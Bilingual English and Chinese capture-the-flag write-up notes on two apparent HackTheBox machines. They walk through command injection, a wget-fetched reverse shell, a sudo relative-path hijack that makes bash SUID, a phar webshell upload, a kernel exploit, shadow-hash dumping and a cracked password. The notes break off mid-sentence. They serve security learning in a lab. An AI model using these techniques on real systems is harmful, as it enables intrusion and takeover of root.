![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252FaWAhoWPUDcusrDgSKTbJ%252FAdmin_Dashboard.PNG%3Falt=media%26token=6c4d365f-050c-4752-b04d-ff93f56587eb&width=768&dpr=4&quality=100&sign=4cd7f07c1f9a8496d4ab431c70819bee9890c91bc447e0eab4550400c02efdf4)

Intercepting the **Generate Report** request showed the date in the body of the POST request. This wasn't escaped properly and command injection was possible.  
截获“生成报告”请求时，会在 POST 请求的正文中显示日期。这没有正确转义，命令注入是可能的。

![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252FMfQwPRNRe3uVgG3g3AF0%252FCommand_Injection.PNG%3Falt=media%26token=1db9963e-c9a4-4624-89b8-17d1bdb736fd&width=768&dpr=4&quality=100&sign=29c1ddea48e08ec9d9ba53bffbe336863f60b5c80d97e31423b75382a880a8fc)

![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252F4iNb76DTOUpS0hHf3Nz4%252FConfirming_Injection.PNG%3Falt=media%26token=b2bb329f-0ab7-44fe-9814-9caf7ebe2f54&width=768&dpr=4&quality=100&sign=01c4fc633f599942beb38ad2ad91d22cf1f1d28064582014dc828a80899439e1)

With command injection established a simple **bash** reverse shell payload could be fetched using wget and piped to bash for execution.  
通过建立命令注入，可以使用 wget 获取简单的 bash 反向 shell 有效负载，并通过管道传输到 bash 执行。

![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252Ff68ZfvMLBydCQ4aFXd0A%252FReverse_Shell.PNG%3Falt=media%26token=db4f2f03-9760-433b-a077-c11787913920&width=768&dpr=4&quality=100&sign=f4b0f752b21e2db54a363bb75f42e5f10e9495a9e82a3a38debd1ab8ec579d0e)

The user flag was located in the **dvir** users home directory.  
用户标志位于 dvir users 主目录中。

![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252FvDWhaEYcjYMZJ2ueTbcd%252FUser_Flag.PNG%3Falt=media%26token=a63af676-1cc4-4d9a-86e8-d5326c4ba653&width=768&dpr=4&quality=100&sign=fccdb65e458dc4d09fb17e1727623125d606001f678302d0fac336ff53130ddf)## 


Privilege Escalation 权限提升

Sudo -l

The **dvir** user has sudo permissions over a binary called **syscheck.**  
dvir 用户对名为 syscheck 的二进制文件具有 sudo 权限。

![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252FGNGJKH8pPmvGGa0bGXNp%252Fsudo_l.PNG%3Falt=media%26token=92f2062d-e8d2-4d17-be82-12d6ec013da0&width=768&dpr=4&quality=100&sign=4479c89795cbe516e108abf10c09262f5514abe8d51d8f04df22a1f7b8e444f5)

When run with sudo the following is output.  
使用 sudo 运行时，将输出以下内容。

![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252F1dWJhROSl2MC3zAAZefJ%252Fimage.png%3Falt=media%26token=63b5fd3b-b2ca-4abe-8be3-6ca9d869f28d&width=768&dpr=4&quality=100&sign=bdd99426fa52ec086fc7ce2031bd4c0caa32e4b1f8996f01e593334f88fbc22b)

The mention of a database service starting warrents further investigation. I tried to see if there was a file being called by running the binary with **strace** but it wasnt installed on the box. Using **strings** on the binary yielded the result I was looking for though.  
提到数据库服务启动需要进一步调查。我试图通过运行带有 strace 的二进制文件来查看是否正在调用文件，但它没有安装在盒子上。不过，在二进制文件上使用字符串产生了我正在寻找的结果。

![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252F84oe1SSxQH1WTSCU0Cno%252Fsyscheck.PNG%3Falt=media%26token=576d56fe-e3b0-406c-a6ca-5930fffc1169&width=768&dpr=4&quality=100&sign=3e453856de8154003e5f1af4a98988dc3414d3c139b739debfb38b3d4b150d50)

The binary is loading a file called **initdb.sh** if a database isnt running, curiously it specifies the binary to load with ./ pre-pended.  
如果数据库没有运行，二进制文件正在加载一个名为 initdb.sh 的文件，奇怪的是，它指定要加载的二进制文件，并预先挂载 ./。

Copy

```
if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/nul
```

This means that the script will look to load **initdb.sh** from the current working directory, meaning a path hijack attack is possible.  
这意味着脚本将寻求从当前工作目录加载 initdb.sh，这意味着路径劫持攻击是可能的。

Path Hijack

There is many payloads that could be used here, I chose to go with an easy option and modify the permissions on the /bin/bash binary making it a **SUID** binary. Taking this approach I can then simply run the updated /bin/bash binary and drop into a root shell.  
这里可以使用许多有效负载，我选择一个简单的选项并修改 /bin/bash 二进制文件的权限，使其成为 SUID 二进制文件。采用这种方法，我可以简单地运行更新的 /bin/bash 二进制文件并放入 root shell。

![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252FRw83LJVNADoWWOn0cdZs%252FSet_UID_bash.PNG%3Falt=media%26token=d51033de-9816-47dd-8ef7-227b7ed9ac21&width=768&dpr=4&quality=100&sign=8fc7e10e26e14ca09f7ce92988e324664f07c468e3cb99447c5404682957bdf8)

From here a simple **/bin/bash -p** drops me into a root shell and I can grab the root flag.  
从这里，一个简单的 /bin/bash -p 将我放入 root shell 中，我可以获取根标志。

The **-p** flag in the above command starts bash in "_privileged mode_". In simple terms, this means that the SUID binary will run as the owner of said binary, not the user invoking it. That's how we get a root shell instead of one as the current user.  
上述命令中的 -p 标志在“特权模式”下启动 bash。简单来说，这意味着 SUID 二进制文件将作为所述二进制文件的所有者运行，而不是作为调用它的用户运行。这就是我们获得 root shell 而不是当前用户的方式。

![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252FuDJCld4fld3plRe0OFp0%252Froot_flag.PNG%3Falt=media%26token=2f7676b4-bdbe-4ca3-b335-68e8c5afb50a&width=768&dpr=4&quality=100&sign=809526eb7dcd3a16a7824c8c1a86c35260a561d3f3b955fff53cbb35c3f264a7)

**Defence**: Where binaries can be run as Sudo, ensure that absolute file paths are used. In this case if the initdb.sh file was being called from say **/usr/bin** the **dvir** user presumably wouldn't have had access to write to that folder and couldn't have hijacked paths to escalate privileges.  
防御：如果二进制文件可以作为 Sudo 运行，请确保使用绝对文件路径。在这种情况下，如果从 /usr/bin 调用 initdb.sh 文件，则 dvir 用户可能无权写入该文件夹，也无法劫持路径以提升权限。
## Hint
若Useragent是由客户端来处理的，那么可能在请求体内被过滤的操作在UA头内就可以绕过。
sudo可以执行的脚本中带有‘./’路径的可执行文件，'./'一般指当前目录下的文件，但是在可执行文件中，这个当前目录指的就是执行该脚本的位置，你可以在你有权限读写的目录执行这个脚本，他会访问你当前目录下的指定文件，这样你就可以伪造文件了。
# [HTB] Hospital
## Enumeration
扫描端口：
![[Pasted image 20240407182439.png]]
![[Pasted image 20240407182517.png]]
目标机（windows?linux?）开放了很多端口，主要针对22，139，389，443，3389，8080进行枚举。
139，389指示了其拥有smb分享，尝试匿名访问，不被允许。
访问443（HTTPS）：
![[Pasted image 20240407182731.png]]
是一个WEBmail系统
访问8080：
![[Pasted image 20240407182809.png]]
是一个PHP应用。
## Get User Flag
在8080端口可以进行注册并上传图片，尝试一些文件名，phar可以被上传，拿到一个webshell：
![[Pasted image 20240407183017.png]]
此webshell并不稳定，使用busybox返回一个nc bashshell，
使用linux exploit suggester并没有什么有趣的结果：
![[Pasted image 20240407183228.png]]
尝试根据内核版本查找可用EXP
```sh
$ uname -a
Linux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 23.04"
NAME="Ubuntu"
VERSION_ID="23.04"
VERSION="23.04 (Lunar Lobster)"
VERSION_CODENAME=lunar
...
...
...
```
找到[Issues · g1vi/CVE-2023-2640-CVE-2023-32629 --- 问题 ·g1vi/CVE-2023-2640-CVE-2023-32629 (github.com)](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)
进行EXP的利用，拿到rootshell:
![[Pasted image 20240407183625.png]]
翻找home及root并未找到userflag
但在Home下找到另外一个用户：drwilliams
尝试dumpshadow文件：
![[Pasted image 20240407183656.png]]
拿到drwilliams的hash,进行破解：
![[Pasted image 20240407183834.png]]
密码为：qwe123!@#
尝试rdp登录，失败。
到443的webmail服务登录，成功。
![[Pasted image 20240407184000.png]]
提到需要设计一个zh
